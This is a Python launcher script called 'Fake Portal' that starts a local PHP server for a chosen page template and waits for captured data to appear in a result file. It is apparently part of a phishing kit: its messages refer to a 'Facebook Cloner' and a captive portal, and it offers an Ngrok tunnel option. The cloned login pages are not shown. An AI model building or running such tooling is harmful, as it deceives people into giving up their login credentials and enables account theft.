#!/usr/bin/env python3
# -*- coding: utf-8 -*-

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

from shutil import which
import sys

print(G + '[+]' + C + ' Checking Dependencies...' + W)
pkgs = ['python3', 'pip3', 'php', 'ssh']
inst = True
for pkg in pkgs:
	present = which(pkg)
	if present == None:
		print(R + '[-] ' + W + pkg + C + ' is not Installed!')
		inst = False
	else:
		pass
if inst == False:
	exit()
else:
	pass

import os
import sys
import time
import json
import argparse
import requests
import subprocess as subp


parser = argparse.ArgumentParser()
parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Ngrok Url ( Optional )')
parser.add_argument('-t', '--tunnel', help='Specify Tunnel Mode [ Available : manual ]')
parser.add_argument('-p', '--port', type=int, default=8080, help='Port for Web Server [ Default : 8080 ]')

args = parser.parse_args()
subdom = args.subdomain
tunnel_mode = args.tunnel
port = args.port

row = []
info = ''
result = ''
version = '1.0'

def banner():
	print (G +
	r'''
 _____ _    _  _______       ____   ___  ____ _____  _    _     
|  ___/ \  | |/ / ____|     |  _ \ / _ \|  _ \_   _|/ \  | |    
| |_ / _ \ | ' /|  _|       | |_) | | | | |_) || | / _ \ | |    
|  _/ ___ \| . \| |___   _  |  __/| |_| |  _ < | |/ ___ \| |___ 
|_|/_/   \_\_|\_\_____| (_) |_|    \___/|_| \_\|_/_/   \_\_____|
          
      ''' + W)
	print('\n' + G + '[>]' + C + ' Coded by  : ' + W + 'Nephacks')
	print(G + '[>]' + C + ' Version    : ' + W + version + '\n')





#Selecting a Template through modules.json .

def template_select():
	global site, info, result
	print(G + '[+]' + C + ' Select an Option : ' + W + '\n')
	
	with open('module/modules.json', 'r') as templ:
		templ_info = templ.read()
	
	templ_json = json.loads(templ_info)
	
	for item in templ_json['templates']:
		name = item['name']
		print(G + '[{}]'.format(templ_json['templates'].index(item)) + C + ' {}'.format(name) + W)
	
	selected = int(input(G + '[>] Enter a Number : -->  ' + W))
	
	try:
		site = templ_json['templates'][selected]['dir_name']
	except IndexError:
		print('\n' + R + '[-]' + C + ' Invalid Input!' + W + '\n')
		sys.exit()
	
	print('\n' + G + '[+]' + C + ' Loading {} Template...'.format(templ_json['templates'][selected]['name']) + W)
	
	module = templ_json['templates'][selected]['module']
	if module == True:
		imp_file = templ_json['templates'][selected]['import_file']
		import importlib
		importlib.import_module('module.{}'.format(imp_file))
	else:
		pass

	info = 'module/{}/php/info.txt'.format(site)
	result = 'module/{}/php/result.txt'.format(site)


#This line defines the PHP server which is required to run when the server and templates , which you select.

def server():
	print('\n' + G + '[+]' + C + ' Port : '+ W + str(port))
	print('\n' + G + '[+]' + C + ' Starting The Local Server......' + W, end='')
	with open('logs/php.log', 'w') as phplog:
		subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'module/{}/'.format(site)], stdout=phplog, stderr=phplog)
		time.sleep(3)
	try:
		php_rqst = requests.get('http://0.0.0.0:{}/index.html'.format(port))
		php_sc = php_rqst.status_code
		if php_sc == 200:
			print(C + '[' + G + ' Success ' + C + ']' + W)
		else:
			print(C + '[' + R + 'Status : {}'.format(php_sc) + C + ']' + W)
	except requests.ConnectionError:
		print(C + '[' + R + ' Failed ' + C + ']' + W)
		Quit()




# This will create a loop that will never end the script or close the script when executed .

def wait():
	printed = False
	while True:
		time.sleep(2)
		size = os.path.getsize(result)
		if size == 0 and printed == False:
			print('\n' + G + '[+] The Server Has been Started Successfully , Now you May Run the Facebook Cloner , Enjoy :xD' + C + ' ' + W + '\n')
			print(r"""
			
 _____ _    _  _______       ____   ___  ____ _____  _    _     
|  ___/ \  | |/ / ____|     |  _ \ / _ \|  _ \_   _|/ \  | |    
| |_ / _ \ | ' /|  _|       | |_) | | | | |_) || | / _ \ | |    
|  _/ ___ \| . \| |___   _  |  __/| |_| |  _ < | |/ ___ \| |___ 
|_|/_/   \_\_|\_\_____| (_) |_|    \___/|_| \_\|_/_/   \_\_____|
          

                 ( Note : Please do not close the script or the captive portal  you created will be closed !! )

			""")
			printed = True
		if size > 0:
			wait()

def repeat():
	wait()


def Quit():
	os.system('pkill php')
	exit()

try:
	banner()
	template_select()
	server()
	wait()

except KeyboardInterrupt:
	print ('\n' + R + '[!]' + C + 'Thanks for Running the Script , Good Bye , Bitch !!' + W)
	Quit()
